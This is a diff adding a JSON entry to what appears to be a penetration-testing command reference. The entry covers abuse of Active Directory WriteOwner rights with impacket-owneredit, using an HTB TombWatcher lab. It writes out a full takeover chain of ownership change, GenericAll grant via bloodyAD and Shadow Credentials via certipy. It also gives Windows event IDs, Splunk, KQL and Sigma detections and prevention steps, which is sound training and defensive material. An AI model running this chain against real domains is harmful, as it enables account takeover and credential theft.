@@ -1,0 +1,100 @@
+{
+  "id": "ad-impacket-owneredit",
+  "name": "impacket-owneredit (WriteOwner Abuse)",
+  "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'",
+  "description": "With WriteOwner over a user or group, take ownership of the object so you can grant yourself any ACL (GenericAll, WriteDACL, etc.). impacket-owneredit modifies the nTSecurityDescriptor Owner SID via LDAP. Once you own the object, use bloodyAD or dacledit to add GenericAll, then Shadow Credentials or password reset to take the account.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB TombWatcher engagement",
+  "tags": [
+    "writeowner",
+    "acl-abuse",
+    "owneredit",
+    "impacket",
+    "object-ownership",
+    "ad-acl"
+  ],
+  "mitre": [
+    "T1222.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nWriteOwner lets you change who OWNS an AD object. Once you are the owner you\ncan modify the DACL - granting yourself GenericAll, then pivoting via Shadow\nCredentials, password reset, or targeted Kerberoast.\n\n=== FULL CHAIN ===\n  1. Take ownership:  impacket-owneredit -action write -new-owner '<user>' -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'\n  2. Grant GenericAll: bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add genericAll '<target_account>' '<user>'\n  3. Pivot:            certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target_account> -dc-ip <dc_ip>\n\n=== WITH NTLM HASH (pass-the-hash) ===\n  impacket-owneredit -action write -new-owner 'sam' -target 'john' -dc-ip <dc_ip> '<domain>/sam:NewPassword123!'\n\n=== RESTORE ORIGINAL OWNER ===\n  impacket-owneredit -action restore -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'\n  (requires the backup file from the write action)\n\n=== CLEANUP ===\nAlways restore original ownership after the engagement - leaving yourself as\nowner of a DA account is an obvious IOC.",
+  "examples": [
+    {
+      "label": "Take ownership of a user object",
+      "command": "impacket-owneredit -action write -new-owner 'sam' -target 'john' -dc-ip 10.129.232.167 'tombwatcher.htb/sam:NewPassword123!'"
+    },
+    {
+      "label": "Chain: grant GenericAll after ownership",
+      "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add genericAll '<target_account>' '<user>'"
+    },
+    {
+      "label": "Chain: Shadow Credentials to get NT hash",
+      "command": "certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target_account> -dc-ip <dc_ip>"
+    }
+  ],
+  "references": [
+    {
+      "title": "impacket-owneredit",
+      "url": "https://github.com/fortra/impacket"
+    },
+    {
+      "title": "The Hacker Recipes - WriteOwner",
+      "url": "https://www.thehacker.recipes/ad/movement/dacl/write-owner"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-bloodyad-toolkit",
+      "note": "After taking ownership, bloodyAD grants GenericAll to complete the chain.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-shadow-credentials",
+      "note": "Shadow Credentials is the cleanest pivot once you have GenericAll.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "WriteOwner permission lets the attacker change the nTSecurityDescriptor Owner field. The object owner has implicit WriteDACL, allowing arbitrary ACE additions. This is a built-in Windows access control mechanism, not a bug.",
+    "prerequisites": "WriteOwner permission over the target object (visible in BloodHound as a WriteOwner edge).",
+    "impact": "Full control of the target object - password reset, Shadow Credentials, DCSync if the target has replication rights.",
+    "detection": "[MITRE T1222.001] Event 4670 (permissions change) on the target object with Owner SID modified; Event 5136 modifying nTSecurityDescriptor.",
+    "artifacts": "4670 owner change event; 5136 DACL modification; impacket-owneredit backup file on attacker disk.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4670\n| where isnotnull(NewSd) AND isnotnull(OldSd)\n| table _time, SubjectUserName, ObjectName, ObjectType, ProcessName",
+    "elastic_kql": "event.code:\"4670\" AND winlog.event_data.ObjectType:\"user\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4670\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, ObjectType\n| where ObjectType contains \"user\" or ObjectType contains \"group\"",
+    "sigma_rules": "win_security_object_owner_changed",
+    "prevention": "Audit and minimize WriteOwner ACEs in AD; alert on 4670 events where the Owner SID changes to a non-admin principal; use AdminSDHolder to protect sensitive accounts.",
+    "sources": [
+      "HTB TombWatcher",
+      "https://attack.mitre.org/techniques/T1222/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "AD object ownership takeover",
+        "logic": "SecurityEvent\n| where EventID == 4670\n| extend NewOwner = extract(@'O:(.+?)D:', 1, NewSd)\n| where NewOwner != extract(@'O:(.+?)D:', 1, OldSd)\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, NewOwner",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4670"
+        ],
+        "attack": [
+          "T1222.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate AD administration changing object ownership during delegation setup",
+        "tuning": "Baseline normal owner-change activity; alert on ownership changes to sensitive accounts (adminCount=1)"
+      }
+    ]
+  }
+}
